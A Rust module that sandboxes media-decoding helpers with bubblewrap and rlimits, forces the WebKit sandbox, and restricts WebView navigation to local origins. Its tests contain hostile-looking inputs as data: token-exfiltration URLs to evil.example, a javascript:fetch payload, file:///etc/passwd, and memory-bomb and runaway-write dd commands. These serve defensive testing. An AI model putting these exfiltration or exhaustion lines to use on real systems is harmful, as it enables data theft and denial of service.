//! Running the media helper subprocesses (`ffmpeg`, `gst-discoverer-1.0`)
//! inside a `bwrap` (bubblewrap) sandbox.
//!
//! These helpers parse **untrusted input**: a thumbnail is generated, and a
//! codec probe is run, for any file that merely appears in a panel — the user
//! never opens it. Their decoders are large C libraries with a long history of
//! memory-safety bugs (libwebp/CVE-2023-4863 and friends), so a crafted file
//! is a plausible code-execution vector, and it fires *passively*, just by
//! browsing a directory. Unsandboxed, that is code execution with the user's
//! full privileges.
//!
//! Each helper therefore runs with: no network, no IPC/PID/user namespace
//! sharing, an empty environment, a read-only view of the system directories,
//! and **only the file being examined** bound in (read-only) — plus, for
//! `ffmpeg`, the thumbnail cache directory bound read-write, the single place
//! it may write. A compromised helper can trash the thumbnail cache and read
//! `/usr`; it cannot reach the user's files, the network, or the repositories.
//!
//! Fail closed: when `bwrap` is unavailable, [`command`] returns `None` and the
//! helper is *not run at all* (the feature degrades to a glyph) rather than run
//! unsandboxed. [`preflight`] makes that case a hard startup error anyway — the
//! WebView's own sandbox needs `bwrap` too.
//!
//! Not covered here: `shell_exec` (commands the *user* typed — deliberately
//! unsandboxed) and `gst-inspect-1.0` (reads the plugin registry, never a
//! user file).

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::process::Command;

/// The `bwrap` binary, resolved through `PATH`.
const BWRAP: &str = "bwrap";

/// Setting this makes WebKit skip its own sandbox; the GUI refuses to start
/// rather than silently render untrusted media in an unconfined web process.
const WEBKIT_DISABLE: &str = "WEBKIT_DISABLE_SANDBOX_THIS_IS_DANGEROUS";

/// Forces WebKitGTK to sandbox its web processes. Set before any web process
/// is spawned (`wry` never enables the sandbox itself, so without this the
/// WebView decodes untrusted media unconfined).
const WEBKIT_FORCE: &str = "WEBKIT_FORCE_SANDBOX";

/// What a sandboxed helper may run and touch. Everything not listed is
/// invisible to it.
pub struct Spec {
    /// Program name, resolved through the sandbox's `PATH`.
    pub program: &'static str,
    pub args: Vec<OsString>,
    /// Bound read-only, at the same path (the file under examination).
    pub read_only: Vec<PathBuf>,
    /// Bound read-write, at the same path (the thumbnail cache).
    pub read_write: Vec<PathBuf>,
    /// Extra environment; the sandbox otherwise starts from an empty one.
    pub env: Vec<(&'static str, OsString)>,
    /// What it may consume (memory, CPU, bytes written).
    pub limits: Limits,
}

impl Spec {
    pub fn new(program: &'static str) -> Self {
        Spec {
            program,
            args: Vec::new(),
            read_only: Vec::new(),
            read_write: Vec::new(),
            env: Vec::new(),
            limits: Limits::default(),
        }
    }

    pub fn limits(mut self, limits: Limits) -> Self {
        self.limits = limits;
        self
    }

    pub fn arg(mut self, arg: impl Into<OsString>) -> Self {
        self.args.push(arg.into());
        self
    }

    pub fn args<I: IntoIterator<Item = OsString>>(mut self, args: I) -> Self {
        self.args.extend(args);
        self
    }

    pub fn read_only(mut self, path: &Path) -> Self {
        self.read_only.push(path.to_path_buf());
        self
    }

    pub fn read_write(mut self, path: &Path) -> Self {
        self.read_write.push(path.to_path_buf());
        self
    }

    pub fn env(mut self, name: &'static str, value: impl Into<OsString>) -> Self {
        self.env.push((name, value.into()));
        self
    }
}

/// The `bwrap` argument list for `spec`, up to and including the program and
/// its arguments after `--`.
///
/// Order matters: the system binds and the `/tmp` tmpfs come first, so a
/// `read_only`/`read_write` path that happens to live under one of them (a
/// file in `/tmp`) is bound *over* it and stays visible.
fn bwrap_args(spec: &Spec) -> Vec<OsString> {
    let mut args: Vec<OsString> = Vec::new();
    let mut push = |arg: &str| args.push(OsString::from(arg));

    // A read-only system, enough to load and run the helper.
    push("--ro-bind");
    push("/usr");
    push("/usr");
    for dir in ["/lib", "/lib64", "/bin", "/sbin"] {
        push("--ro-bind-try");
        push(dir);
        push(dir);
    }
    // Only the loader/font configuration, not all of /etc (which holds host
    // configuration and, on some systems, secrets).
    for file in ["/etc/ld.so.cache", "/etc/ld.so.conf", "/etc/ld.so.conf.d", "/etc/fonts"] {
        push("--ro-bind-try");
        push(file);
        push(file);
    }
    push("--dev");
    push("/dev");
    push("--tmpfs");
    push("/tmp");

    // No network, no IPC, no PID/user/UTS/cgroup sharing. `/proc` is *not*
    // mounted: neither helper needs it, and a fresh `proc` mount is refused
    // inside some containers.
    push("--unshare-all");
    push("--die-with-parent");
    // No controlling terminal (a sandboxed process could otherwise inject
    // keystrokes into ours with TIOCSTI).
    push("--new-session");

    push("--clearenv");
    push("--setenv");
    push("PATH");
    push("/usr/bin:/bin:/usr/sbin:/sbin");
    push("--setenv");
    push("HOME");
    push("/tmp");
    for (name, value) in &spec.env {
        args.push(OsString::from("--setenv"));
        args.push(OsString::from(*name));
        args.push(value.clone());
    }

    for path in &spec.read_only {
        args.push(OsString::from("--ro-bind"));
        args.push(path.into());
        args.push(path.into());
    }
    for path in &spec.read_write {
        args.push(OsString::from("--bind"));
        args.push(path.into());
        args.push(path.into());
    }

    args.push(OsString::from("--chdir"));
    args.push(OsString::from("/"));
    args.push(OsString::from("--"));
    args.push(OsString::from(spec.program));
    args.extend(spec.args.iter().cloned());
    args
}

/// Resource ceilings for a helper. `bwrap` bounds what a decoder can *reach*;
/// these bound what it can *consume* — a crafted file whose decode balloons to
/// gigabytes, spins forever, or writes without end must die on its own rather
/// than take the machine with it. The wall-clock timeout in `proc` only kills a
/// process that is still *running*; it does nothing about a machine already
/// thrashing on a 30 GiB allocation.
///
/// Generous by design: an honest extraction must be untouched by them (a
/// 320-px poster is ~40 KiB and a fraction of a second of CPU).
#[derive(Debug, Clone, Copy)]
pub struct Limits {
    /// Address space (`RLIMIT_AS`), bytes.
    pub address_space: u64,
    /// CPU time (`RLIMIT_CPU`), seconds — a backstop under the wall clock.
    pub cpu_seconds: u64,
    /// Size of any file it writes (`RLIMIT_FSIZE`), bytes.
    pub file_size: u64,
}

impl Default for Limits {
    fn default() -> Self {
        Limits {
            address_space: 2 * 1024 * 1024 * 1024, // 2 GiB
            cpu_seconds: 30,
            file_size: 64 * 1024 * 1024, // 64 MiB
        }
    }
}

/// A [`Command`] running `spec` under `bwrap`, or `None` when the sandbox is
/// unavailable — in which case the helper must **not** be run (fail closed).
pub fn command(spec: &Spec) -> Option<Command> {
    if !available() {
        return None;
    }
    let mut cmd = Command::new(BWRAP);
    cmd.args(bwrap_args(spec));
    apply_limits(&mut cmd, spec.limits);
    Some(cmd)
}

/// Sets the rlimits on the child. They are applied to `bwrap` itself, between
/// `fork` and `exec`, and every process it goes on to spawn inherits them —
/// the helper included.
#[cfg(target_os = "linux")]
fn apply_limits(cmd: &mut Command, limits: Limits) {
    use std::os::unix::process::CommandExt;

    // SAFETY: runs in the forked child before exec. `setrlimit` is
    // async-signal-safe, allocates nothing, and touches no lock.
    unsafe {
        cmd.pre_exec(move || {
            for (resource, value) in [
                (libc::RLIMIT_AS, limits.address_space),
                (libc::RLIMIT_CPU, limits.cpu_seconds),
                (libc::RLIMIT_FSIZE, limits.file_size),
                // No core dump: a decoder that crashes on a crafted file would
                // otherwise drop a multi-gigabyte image of it on the disk.
                (libc::RLIMIT_CORE, 0),
            ] {
                let limit = libc::rlimit { rlim_cur: value, rlim_max: value };
                if libc::setrlimit(resource, &limit) != 0 {
                    return Err(std::io::Error::last_os_error());
                }
            }
            Ok(())
        });
    }
}

#[cfg(not(target_os = "linux"))]
fn apply_limits(_cmd: &mut Command, _limits: Limits) {}

/// Whether a working `bwrap` is available: the binary exists *and* a real
/// sandbox can actually be created (unprivileged user namespaces may be
/// disabled by the kernel or a container policy). Probed once.
pub fn available() -> bool {
    static AVAILABLE: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
    *AVAILABLE.get_or_init(|| smoke_test().is_ok())
}

/// Runs a trivial command through the real sandbox profile. `Err` carries the
/// reason, for the startup error message.
fn smoke_test() -> Result<(), String> {
    let spec = Spec::new("sh").arg("-c").arg(":");
    let mut cmd = Command::new(BWRAP);
    cmd.args(bwrap_args(&spec));
    // The limits too, so the probe exercises exactly what a helper will run
    // under: a ceiling low enough to break bwrap itself must fail here, at
    // startup, not silently disable thumbnails later.
    apply_limits(&mut cmd, spec.limits);
    let output = crate::proc::run_with_timeout(cmd, std::time::Duration::from_secs(10))
        .ok_or_else(|| format!("`{BWRAP}` could not be run (is bubblewrap installed?)"))?;
    if output.status.success() {
        return Ok(());
    }
    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
    Err(format!("`{BWRAP}` cannot create a sandbox: {stderr}"))
}

/// The startup decision, given the environment and whether the sandbox probe
/// succeeded. Pure — [`preflight`] supplies the two facts.
fn preflight_result(disable_env: Option<OsString>, sandbox: Result<(), String>) -> Result<(), String> {
    if disable_env.is_some() {
        return Err(format!(
            "{WEBKIT_DISABLE} is set: the WebView would decode untrusted media \
             (images, video) in an unconfined process. Unset it to start the GUI."
        ));
    }
    sandbox.map_err(|reason| {
        format!(
            "{reason}\n\
             The GUI needs bubblewrap: it sandboxes the WebView's web process \
             (WebKit spawns it through bwrap) and the ffmpeg/gst-discoverer media \
             helpers, all of which decode untrusted files.\n\
             Install it (Arch: `pacman -S bubblewrap`) and make sure unprivileged \
             user namespaces are enabled."
        )
    })
}

/// Verifies at startup that media decoding will be sandboxed, and turns on the
/// WebKit sandbox (which `wry` leaves off). `Err` is fatal: the caller must not
/// open the GUI.
///
/// Must run before the WebView is created — WebKit reads [`WEBKIT_FORCE`] when
/// it spawns its web process, and refuses to change its mind afterwards.
///
/// `allow_unsandboxed_webview` is the development escape hatch: it drops the
/// *WebView* requirement (the caller must warn), never the helpers' — those
/// fail closed in [`command`] on their own.
pub fn preflight(allow_unsandboxed_webview: bool) -> Result<(), String> {
    if allow_unsandboxed_webview {
        return Ok(());
    }
    preflight_result(std::env::var_os(WEBKIT_DISABLE), smoke_test())?;
    // SAFETY: single-threaded startup, before the Tauri runtime exists.
    unsafe { std::env::set_var(WEBKIT_FORCE, "1") };
    Ok(())
}

/// Whether the WebView may navigate to `uri`.
///
/// The CSP keeps the web realm from *fetching* anything remote, but no CSP
/// directive governs top-level navigation: `location.href = 'https://evil/?' +
/// token` would still leave, carrying whatever it likes in the URL. This is the
/// matching gate — only the app's own origins are navigable, so the WebView
/// cannot reach the internet by any route.
///
/// `about:blank` and the Tauri/asset custom protocols are the app's own; a
/// URI we cannot make sense of is refused (fail closed).
pub fn is_local_navigation(uri: &str) -> bool {
    let uri = uri.trim();
    if uri.is_empty() {
        return false;
    }
    const LOCAL_PREFIXES: &[&str] = &[
        "about:blank",
        "tauri://",
        "asset://",
        "ipc://",
        "http://tauri.localhost",
        "http://ipc.localhost",
        "http://asset.localhost",
        "http://127.0.0.1:",
        "http://localhost:",
    ];
    LOCAL_PREFIXES.iter().any(|prefix| uri.starts_with(prefix))
}

/// Whether WebKit's web process — the one that decodes the images and video a
/// panel displays — is really confined.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WebProcess {
    /// No web process among our descendants (it has not spawned yet, or
    /// WebKit renamed it). Nothing is asserted: an inconclusive probe must
    /// never fail the GUI.
    NotFound,
    /// Running in its own user namespace — WebKit went through `bwrap`.
    Sandboxed,
    /// Sharing our namespaces: a decoder bug there is a bug in *our* process's
    /// privileges. Fatal.
    Unconfined,
}

/// One row of the process table: `(pid, ppid, comm)`.
type ProcRow = (u32, u32, String);

/// `comm` is truncated to 15 characters by the kernel, so the web process
/// shows up as `WebKitWebProces`. Match on a prefix that survives that.
const WEB_PROCESS_COMM: &str = "WebKitWebProc";

/// The pids descending from `root` (children, grandchildren…), excluding
/// `root`. Pure, so the traversal is testable without a process tree.
fn descendants(processes: &[ProcRow], root: u32) -> Vec<u32> {
    let mut found = Vec::new();
    let mut frontier = vec![root];
    while let Some(parent) = frontier.pop() {
        for (pid, ppid, _comm) in processes {
            if *ppid == parent && !found.contains(pid) && *pid != root {
                found.push(*pid);
                frontier.push(*pid);
            }
        }
    }
    found
}

/// Classifies the web process among `root`'s descendants, given a way to read
/// a pid's user namespace. Pure — [`web_process_status`] supplies `/proc`.
fn classify(
    processes: &[ProcRow],
    root: u32,
    our_namespace: Option<String>,
    namespace_of: impl Fn(u32) -> Option<String>,
) -> WebProcess {
    for pid in descendants(processes, root) {
        let Some((_, _, comm)) = processes.iter().find(|(candidate, _, _)| *candidate == pid)
        else {
            continue;
        };
        if !comm.starts_with(WEB_PROCESS_COMM) {
            continue;
        }
        // Same user namespace as us ⇒ bwrap never wrapped it.
        return match (namespace_of(pid), &our_namespace) {
            (Some(theirs), Some(ours)) if theirs == *ours => WebProcess::Unconfined,
            (Some(_), Some(_)) => WebProcess::Sandboxed,
            // Cannot tell: stay silent rather than kill the GUI on a guess.
            _ => WebProcess::NotFound,
        };
    }
    WebProcess::NotFound
}

/// Reads `/proc` and reports whether WebKit's web process is confined.
pub fn web_process_status() -> WebProcess {
    let processes = proc_table();
    let ours = std::fs::read_link("/proc/self/ns/user")
        .ok()
        .map(|target| target.to_string_lossy().into_owned());
    classify(&processes, std::process::id(), ours, |pid| {
        std::fs::read_link(format!("/proc/{pid}/ns/user"))
            .ok()
            .map(|target| target.to_string_lossy().into_owned())
    })
}

/// `(pid, ppid, comm)` for every process we can see.
fn proc_table() -> Vec<ProcRow> {
    let Ok(entries) = std::fs::read_dir("/proc") else {
        return Vec::new();
    };
    entries
        .flatten()
        .filter_map(|entry| {
            let pid: u32 = entry.file_name().to_string_lossy().parse().ok()?;
            let comm = std::fs::read_to_string(format!("/proc/{pid}/comm")).ok()?;
            let status = std::fs::read_to_string(format!("/proc/{pid}/status")).ok()?;
            let ppid = status
                .lines()
                .find_map(|line| line.strip_prefix("PPid:"))?
                .trim()
                .parse()
                .ok()?;
            Some((pid, ppid, comm.trim().to_string()))
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn strings(spec: &Spec) -> Vec<String> {
        bwrap_args(spec).iter().map(|arg| arg.to_string_lossy().into_owned()).collect()
    }

    /// The arg list must window into `[flag, source, dest]` triplets; this
    /// finds one by flag + source.
    fn has_bind(args: &[String], flag: &str, path: &str) -> bool {
        args.windows(3).any(|w| w[0] == flag && w[1] == path && w[2] == path)
    }

    #[test]
    fn test_isolation_flags_are_always_present() {
        let args = strings(&Spec::new("ffmpeg"));
        for flag in ["--unshare-all", "--die-with-parent", "--new-session", "--clearenv"] {
            assert!(args.contains(&flag.to_string()), "missing {flag}: {args:?}");
        }
        // A fresh /proc is never mounted (some containers forbid it).
        assert!(!args.contains(&"--proc".to_string()));
        // The whole of /etc is never exposed, only the loader/font bits.
        assert!(!has_bind(&args, "--ro-bind", "/etc"));
        assert!(has_bind(&args, "--ro-bind-try", "/etc/ld.so.cache"));
    }

    #[test]
    fn test_examined_file_is_read_only_and_cache_is_read_write() {
        let spec = Spec::new("ffmpeg")
            .read_only(Path::new("/home/u/clip.mp4"))
            .read_write(Path::new("/repo/.metafolder/internal/thumbnails"));
        let args = strings(&spec);
        assert!(has_bind(&args, "--ro-bind", "/home/u/clip.mp4"));
        assert!(has_bind(&args, "--bind", "/repo/.metafolder/internal/thumbnails"));
        // The home directory itself is never bound.
        assert!(!has_bind(&args, "--ro-bind", "/home/u"));
    }

    #[test]
    fn test_binds_come_after_the_tmpfs_so_a_tmp_file_stays_visible() {
        let spec = Spec::new("ffmpeg").read_only(Path::new("/tmp/clip.mp4"));
        let args = strings(&spec);
        let tmpfs = args.iter().position(|arg| arg == "--tmpfs").expect("tmpfs");
        // The *file's* bind, not the /usr one that opens the list.
        let bind = args
            .windows(2)
            .position(|w| w[0] == "--ro-bind" && w[1] == "/tmp/clip.mp4")
            .expect("the file's ro-bind");
        assert!(tmpfs < bind, "a /tmp source bound before the tmpfs would be hidden by it");
    }

    #[test]
    fn test_program_and_args_come_after_the_double_dash() {
        let spec = Spec::new("gst-discoverer-1.0").arg("/a/file.mp4");
        let args = strings(&spec);
        let dashes = args.iter().position(|arg| arg == "--").expect("--");
        assert_eq!(args[dashes + 1..], ["gst-discoverer-1.0", "/a/file.mp4"]);
    }

    #[test]
    fn test_extra_env_is_set_on_an_otherwise_empty_environment() {
        let spec = Spec::new("gst-discoverer-1.0").env("GST_REGISTRY", "/tmp/registry.bin");
        let args = strings(&spec);
        assert!(args.contains(&"--clearenv".to_string()));
        assert!(args.windows(3).any(|w| w[0] == "--setenv"
            && w[1] == "GST_REGISTRY"
            && w[2] == "/tmp/registry.bin"));
    }

    #[test]
    fn test_preflight_refuses_to_start_when_the_webkit_sandbox_is_disabled() {
        let error = preflight_result(Some(OsString::from("1")), Ok(()))
            .expect_err("the disable env var must be fatal");
        assert!(error.contains(WEBKIT_DISABLE), "{error}");
    }

    #[test]
    fn test_preflight_refuses_to_start_without_a_working_sandbox() {
        let error = preflight_result(None, Err("no bwrap".into()))
            .expect_err("a broken sandbox must be fatal");
        assert!(error.contains("no bwrap"), "{error}");
        assert!(error.contains("bubblewrap"), "{error}");
    }

    #[test]
    fn test_preflight_passes_with_a_working_sandbox_and_a_clean_environment() {
        assert!(preflight_result(None, Ok(())).is_ok());
    }

    // --- Navigation: the WebView must never leave the app's own origins.

    #[test]
    fn test_the_apps_own_origins_are_navigable() {
        for uri in [
            "http://tauri.localhost/",
            "http://127.0.0.1:7524/panel/file/index.html",
            "http://localhost:7524/fsraw?path=/a/b.png",
            "about:blank",
            "tauri://localhost",
        ] {
            assert!(is_local_navigation(uri), "must stay navigable: {uri}");
        }
    }

    #[test]
    fn test_no_remote_navigation() {
        for uri in [
            "https://evil.example/?token=abcdef",
            "http://evil.example/",
            // No CSP directive governs navigation, so this is the exfiltration
            // route the policy gate exists to close.
            "http://127.0.0.1.evil.example/",
            "https://127.0.0.1/",
            "ftp://evil.example/",
            "javascript:fetch('https://evil.example')",
            "file:///etc/passwd",
            "",
        ] {
            assert!(!is_local_navigation(uri), "must be refused: {uri:?}");
        }
    }

    // --- The WebKit web-process check.

    /// GUI (100) → bwrap (200) → WebKitWebProcess (300), plus an unrelated
    /// process the GUI did not spawn.
    fn tree() -> Vec<ProcRow> {
        vec![
            (100, 1, "metafolder-gui".into()),
            (200, 100, "bwrap".into()),
            (300, 200, "WebKitWebProces".into()),
            (400, 1, "someone-else".into()),
        ]
    }

    #[test]
    fn test_descendants_walks_the_whole_subtree_and_stops_there() {
        let mut found = descendants(&tree(), 100);
        found.sort();
        assert_eq!(found, vec![200, 300], "a process we did not spawn is not ours to judge");
    }

    #[test]
    fn test_web_process_in_its_own_namespace_is_sandboxed() {
        let status = classify(&tree(), 100, Some("user:[1000]".into()), |pid| {
            Some(if pid == 300 { "user:[4242]".into() } else { "user:[1000]".into() })
        });
        assert_eq!(status, WebProcess::Sandboxed);
    }

    #[test]
    fn test_web_process_sharing_our_namespace_is_unconfined() {
        let status =
            classify(&tree(), 100, Some("user:[1000]".into()), |_| Some("user:[1000]".into()));
        assert_eq!(status, WebProcess::Unconfined);
    }

    #[test]
    fn test_no_web_process_yet_asserts_nothing() {
        let processes = vec![(100, 1, "metafolder-gui".to_string())];
        let status = classify(&processes, 100, Some("user:[1000]".into()), |_| None);
        assert_eq!(status, WebProcess::NotFound, "an inconclusive probe must not kill the GUI");
    }

    #[test]
    fn test_unreadable_namespace_asserts_nothing() {
        // Cannot compare ⇒ no verdict, rather than a false alarm.
        let status = classify(&tree(), 100, None, |_| None);
        assert_eq!(status, WebProcess::NotFound);
    }

    #[test]
    fn test_a_web_process_of_another_application_is_ignored() {
        // Same comm, but not our descendant: another WebKit app's web process
        // must not be mistaken for ours.
        let processes = vec![(100, 1, "metafolder-gui".into()), (500, 1, "WebKitWebProces".into())];
        let status =
            classify(&processes, 100, Some("user:[1000]".into()), |_| Some("user:[1000]".into()));
        assert_eq!(status, WebProcess::NotFound);
    }

    #[test]
    fn test_proc_table_sees_this_process_with_its_real_parent() {
        let processes = proc_table();
        let ours = std::process::id();
        let (_, ppid, _) = processes
            .iter()
            .find(|(pid, _, _)| *pid == ours)
            .expect("the test process must appear in /proc");
        assert_ne!(*ppid, 0, "a real parent pid must be parsed");
    }

    // --- Tests against the real sandbox. Skipped where bwrap cannot run
    // (CI without unprivileged user namespaces); `available()` is what the
    // production code gates on too.

    fn run(spec: &Spec) -> std::process::Output {
        let cmd = command(spec).expect("bwrap available");
        crate::proc::run_with_timeout(cmd, std::time::Duration::from_secs(15)).expect("ran")
    }

    #[test]
    fn test_sandboxed_process_cannot_read_an_unbound_file() {
        if !available() {
            return;
        }
        let secret = std::env::temp_dir().join("mf-sandbox-secret.txt");
        std::fs::write(&secret, "top secret").expect("write");

        let spec = Spec::new("sh").arg("-c").arg(format!("cat {}", secret.display()));
        let output = run(&spec);

        assert!(!output.status.success(), "an unbound file must not be readable");
        assert!(!String::from_utf8_lossy(&output.stdout).contains("top secret"));
        let _ = std::fs::remove_file(&secret);
    }

    #[test]
    fn test_sandboxed_process_reads_a_read_only_bind_but_cannot_write_it() {
        if !available() {
            return;
        }
        let file = std::env::temp_dir().join("mf-sandbox-ro.txt");
        std::fs::write(&file, "readable").expect("write");

        let read = run(&Spec::new("sh")
            .arg("-c")
            .arg(format!("cat {}", file.display()))
            .read_only(&file));
        assert!(read.status.success(), "a read-only bind must be readable");
        assert_eq!(String::from_utf8_lossy(&read.stdout), "readable");

        let write = run(&Spec::new("sh")
            .arg("-c")
            .arg(format!("echo pwned > {}", file.display()))
            .read_only(&file));
        assert!(!write.status.success(), "a read-only bind must not be writable");
        assert_eq!(std::fs::read_to_string(&file).expect("read"), "readable");
        let _ = std::fs::remove_file(&file);
    }

    #[test]
    fn test_sandboxed_process_writes_a_read_write_bind() {
        if !available() {
            return;
        }
        let dir = std::env::temp_dir().join("mf-sandbox-rw");
        std::fs::create_dir_all(&dir).expect("mkdir");

        let output = run(&Spec::new("sh")
            .arg("-c")
            .arg(format!("echo written > {}/out.txt", dir.display()))
            .read_write(&dir));

        assert!(output.status.success(), "a read-write bind must be writable");
        assert_eq!(std::fs::read_to_string(dir.join("out.txt")).expect("read"), "written\n");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// bwrap bounds what a decoder can *reach*; the rlimits bound what it can
    /// *consume*. A crafted file whose decode balloons to gigabytes must die,
    /// not take the machine down with it.
    #[test]
    fn test_a_memory_bomb_hits_the_address_space_limit() {
        if !available() {
            return;
        }
        // `dd` allocates its whole block size up front: far past the limit.
        let output = run(&Spec::new("sh").arg("-c").arg("dd if=/dev/zero of=/dev/null bs=8G count=1"));
        assert!(
            !output.status.success(),
            "an allocation past the address-space limit must fail, not succeed"
        );
    }

    /// A decoder that never stops writing must not be able to fill the disk
    /// (the thumbnail cache is the one place ffmpeg *can* write).
    #[test]
    fn test_a_runaway_write_hits_the_file_size_limit() {
        if !available() {
            return;
        }
        // A real read-write bind on disk, not the sandbox's tmpfs (which is
        // RAM-bounded on its own and would stop the write for the wrong
        // reason). Only RLIMIT_FSIZE can fail this one.
        let dir = std::env::temp_dir().join("mf-sandbox-fsize");
        std::fs::create_dir_all(&dir).expect("mkdir");
        let output = run(&Spec::new("sh")
            .arg("-c")
            .arg(format!("dd if=/dev/zero of={}/runaway bs=1M count=256 2>/dev/null", dir.display()))
            .read_write(&dir));

        assert!(!output.status.success(), "a write past the file-size limit must be killed");
        let written = std::fs::metadata(dir.join("runaway")).map(|meta| meta.len()).unwrap_or(0);
        assert!(written < 256 * 1024 * 1024, "the write must have been cut short, got {written}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The limits must leave a real thumbnail extraction room to work — a
    /// sandbox that also breaks the feature is not a fix.
    #[test]
    fn test_the_limits_leave_room_for_a_real_decode() {
        if !available() {
            return;
        }
        let output = run(&Spec::new("sh").arg("-c").arg("dd if=/dev/zero of=/tmp/ok bs=1M count=8"));
        assert!(output.status.success(), "an ordinary write must still succeed: {output:?}");
    }

    #[test]
    fn test_sandboxed_process_has_no_network() {
        if !available() {
            return;
        }
        // No loopback beyond the namespace's own, and no route out: binding
        // is not the point — reaching another host is. `sh` has no networking
        // built in, so probe /proc-free: the interface list is empty except lo.
        let output = run(&Spec::new("sh").arg("-c").arg("ip -o link 2>/dev/null | wc -l"));
        let count: i32 =
            String::from_utf8_lossy(&output.stdout).trim().parse().unwrap_or(i32::MAX);
        assert!(count <= 1, "the sandbox must have no network interface but loopback");
    }
}
